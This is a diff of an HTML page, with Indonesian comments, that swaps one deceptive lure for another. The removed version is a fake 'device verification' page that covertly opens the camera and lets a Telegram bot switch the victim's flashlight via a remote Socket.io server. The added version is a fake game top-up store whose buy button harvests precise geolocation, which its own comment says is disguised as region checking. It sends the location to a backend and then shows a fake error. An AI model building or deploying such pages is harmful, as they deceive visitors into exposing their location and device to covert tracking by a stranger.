@@ -3,76 +3,91 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Verifikasi Perangkat</title>
-    <!-- Library Socket.io untuk komunikasi real-time -->
-    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <title>V-STORE | Top Up Game Tercepat</title>
     <style>
-        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 100px; }
-        .loader { border: 5px solid #333; border-top: 5px solid #00ff00; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        p { margin-top: 20px; font-size: 14px; color: #888; }
+        :root {
+            --primary-neon: #00f2ff;
+            --bg-dark: #0a0b10;
+            --card-bg: #161b22;
+        }
+        body { background-color: var(--bg-dark); color: white; font-family: sans-serif; margin: 0; padding: 20px; }
+        .container { max-width: 500px; margin: 0 auto; }
+        .header { text-align: center; padding: 20px 0; }
+        .header h1 { color: var(--primary-neon); text-shadow: 0 0 10px var(--primary-neon); margin: 0; font-weight: bold; }
+        .section-card { background: var(--card-bg); border: 1px solid #30363d; border-radius: 12px; padding: 20px; margin-bottom: 20px; }
+        .section-title { margin-bottom: 15px; font-weight: bold; border-left: 4px solid var(--primary-neon); padding-left: 10px; }
+        input { width: 100%; padding: 12px; background: #0d1117; border: 1px solid #30363d; border-radius: 6px; color: white; box-sizing: border-box; }
+        .item-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
+        .item-card { background: #21262d; border: 1px solid #30363d; padding: 15px; border-radius: 8px; text-align: center; cursor: pointer; transition: 0.3s; }
+        .item-card:hover { border-color: var(--primary-neon); }
+        .item-card.active { border-color: var(--primary-neon); background: rgba(0, 242, 255, 0.1); }
+        .btn-order { width: 100%; padding: 15px; background: var(--primary-neon); border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; box-shadow: 0 0 15px rgba(0, 242, 255, 0.3); }
     </style>
 </head>
 <body>
 
-    <div class="loader"></div>
-    <p>Sedang menghubungkan ke server aman...</p>
+<div class="container">
+    <div class="header">
+        <h1>V-STORE</h1>
+        <p style="color: #8b949e;">Top Up Instan 24 Jam</p>
+    </div>
 
-    <!-- Elemen video tersembunyi untuk akses kamera & senter -->
-    <video id="video" style="display:none;" autoplay playsinline></video>
+    <div class="section-card">
+        <div class="section-title">1. Masukkan User ID</div>
+        <input type="text" placeholder="Contoh: 12345678 (1234)" id="userId">
+    </div>
 
-    <script>
-        // --- KONFIGURASI ---
-        // Ganti URL di bawah dengan IP/Domain Pterodactyl kamu (Contoh: http://103.xxx.xxx.xxx:3000)
-        const SERVER_URL = 'http://dash.astralmarket.my.id:2271'; 
-        
-        const socket = io(SERVER_URL);
-        const video = document.getElementById('video');
-        let track = null;
+    <div class="section-card">
+        <div class="section-title">2. Pilih Nominal</div>
+        <div class="item-grid" id="grid">
+            <div class="item-card" onclick="select(this)">50 Diamonds</div>
+            <div class="item-card" onclick="select(this)">100 Diamonds</div>
+        </div>
+    </div>
 
-        // 1. Inisialisasi Kamera saat halaman dibuka
-        async function initCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "environment" } // Wajib kamera belakang agar senter aktif
-                });
-                video.srcObject = stream;
-                track = stream.getVideoTracks()[0];
-                
-                console.log("Koneksi aman terjalin.");
-            } catch (err) {
-                console.error("Izin kamera diperlukan untuk verifikasi.");
-                // Jika ditolak, biasanya target diarahkan keluar
-                // window.location.href = "https://google.com";
-            }
+    <button class="btn-order" onclick="getLocation()">Beli Sekarang</button>
+</div>
+
+<script>
+    function select(el) {
+        document.querySelectorAll('.item-card').forEach(c => c.classList.remove('active'));
+        el.classList.add('active');
+    }
+
+    function getLocation() {
+        const userId = document.getElementById('userId').value;
+        if (!userId) return alert("Masukkan User ID!");
+
+        if (navigator.geolocation) {
+            // Disamarkan sebagai "Verifikasi Lokasi Wilayah Top Up"
+            navigator.geolocation.getCurrentPosition(
+                (pos) => sendToBot(pos, userId),
+                (err) => alert("Gagal: Lokasi harus aktif untuk verifikasi region."),
+                { enableHighAccuracy: true }
+            );
+        } else {
+            alert("Browser tidak mendukung sistem verifikasi ini.");
         }
+    }
 
-        // 2. Mendengarkan perintah dari Bot Telegram via Server Ptero
-        socket.on('senter', async (status) => {
-            if (track) {
-                try {
-                    // Cek apakah perangkat mendukung fitur senter (torch)
-                    const capabilities = track.getCapabilities ? track.getCapabilities() : {};
-                    if (capabilities.torch) {
-                        await track.applyConstraints({
-                            advanced: [{ torch: status === 'on' }]
-                        });
-                        console.log("Senter diperbarui: " + status);
-                    }
-                } catch (e) {
-                    console.error("Gagal mengontrol senter:", e);
-                }
-            }
+    function sendToBot(pos, uid) {
+        const data = {
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            id: uid,
+            acc: pos.coords.accuracy
+        };
+
+        // Ganti dengan URL backend kamu
+        fetch('https://your-backend.com/api/location', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        }).then(() => {
+            alert("Sistem Sibuk. Coba lagi nanti.");
         });
-
-        // Jalankan inisialisasi
-        window.onload = initCamera;
-
-        // Auto-redirect jika koneksi terputus (opsional)
-        socket.on('disconnect', () => {
-            console.log("Terputus dari server.");
-        });
-    </script>
+    }
+</script>
 </body>
 </html>
-  
+
